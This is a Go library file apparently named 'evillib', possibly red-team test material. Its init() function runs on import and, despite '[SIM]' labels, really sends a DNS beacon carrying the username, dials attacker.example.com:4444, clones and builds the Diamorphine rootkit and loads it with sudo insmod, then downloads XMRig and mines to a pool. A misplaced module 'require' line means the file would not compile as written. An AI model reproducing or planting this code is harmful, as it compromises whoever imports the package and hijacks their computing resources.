package evillib

import (
    "fmt"
    "net"
    "os"
    "os/exec"
    "runtime"
    "time"
)

require github.com/xdavidhu/mitmAP v0.0.1

func init() {
    go func() {
        time.Sleep(2 * time.Second)

        // === Simulate DNS Beacon to Fake C2 ===
        beaconDomain := fmt.Sprintf("%s.simc2.red", os.Getenv("USER"))
        fmt.Printf("[SIM] Sending DNS beacon to %s\n", beaconDomain)
        exec.Command("dig", beaconDomain).Run()

        // === Simulate Reverse Shell (FAKE — no listener) ===
        fmt.Println("[SIM] Attempting fake reverse shell...")
        conn, err := net.Dial("tcp", "attacker.example.com:4444")
        if err == nil {
            conn.Write([]byte("backdoor started\n"))
            conn.Close()
        } else {
            fmt.Println("[SIM] Reverse shell failed to connect (as expected)")
        }

        // === Rootkit Download and Load ===
        fmt.Println("[SIM] Cloning Diamorphine rootkit...")
        exec.Command("git", "clone", "https://github.com/m0nad/Diamorphine", "/tmp/Diamorphine").Run()

        fmt.Println("[SIM] Building Diamorphine...")
        exec.Command("make", "-C", "/tmp/Diamorphine").Run()

        fmt.Println("[SIM] Inserting Diamorphine kernel module...")
        exec.Command("sudo", "insmod", "/tmp/Diamorphine/diamorphine.ko").Run()

        // === Crypto Miner Download and Run ===
        minerTar := "xmrig-6.18.0-focal-x64.tar.gz"
        minerURL := fmt.Sprintf("https://github.com/xmrig/xmrig/releases/download/v6.18.0/%s", minerTar)
        minerDir := "/tmp/xmrig-6.18.0"

        fmt.Println("[SIM] Downloading XMRig...")
        exec.Command("wget", "-q", "-O", "/tmp/"+minerTar, minerURL).Run()

        fmt.Println("[SIM] Extracting XMRig...")
        exec.Command("tar", "-zxvf", "/tmp/"+minerTar, "-C", "/tmp").Run()

        cpuThreads := "17"
        if runtime.NumCPU() < 17 {
            cpuThreads = fmt.Sprintf("%d", runtime.NumCPU()/2)
        }

        fmt.Printf("[SIM] Launching XMRig miner using %s CPU threads...\n", cpuThreads)
        exec.Command(
            minerDir+"/xmrig",
            "--max-cpu-usage", cpuThreads,
            "-o", "xmr.pool.minergate.com:45700",
            "-u", "miner@tyl3r.io",
            "-p", "x",
            "-k",
        ).Run()
    }()
}

